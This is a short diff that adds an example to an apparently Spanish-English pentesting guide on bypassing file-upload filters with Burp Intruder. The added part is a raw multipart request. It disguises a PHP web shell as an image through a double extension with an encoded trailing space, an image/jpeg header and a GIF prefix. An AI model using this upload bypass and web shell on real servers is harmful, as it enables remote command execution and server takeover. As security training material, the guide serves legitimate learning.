@@ -360,4 +360,11 @@ GIF89a
 With it, we can use the Cluster Bomb attack with intruder and configurate all casuistries and attack, important then, configurate into settings > grep-extract a filter -->
 
 ```
+-----------------------------353231978911704809013224416258
+Content-Disposition: form-data; name="uploadFile"; filename="ws.jpg.phtml%20"
+Content-Type: image/jpeg
+
+GIF8
+<?php system($_GET['cmd']); ?>
+-----------------------------353231978911704809013224416258--
 ```
